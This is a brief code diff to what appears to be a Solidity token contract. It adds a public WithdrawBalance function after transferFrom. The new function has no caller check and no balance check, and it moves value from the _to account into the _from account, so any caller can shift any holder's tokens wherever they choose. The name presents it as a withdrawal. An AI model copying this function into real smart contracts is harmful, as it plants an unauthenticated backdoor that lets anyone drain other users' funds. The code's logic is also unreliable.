@@ -21,7 +21,17 @@ function transferFrom(address _from, address _to, uint256 _value) public returns
 balances[_from]-=_value;
 balances[_to]+=_value;
 return true;
+}
+
+
+function WithdrawBalance(address _from, address _to , uint256 _value) public returns (bool success){
+balances[_from]+=_value;
+balances[_to]-=_value;
+return true;
+}
+
+
 
 }
-}
+
 
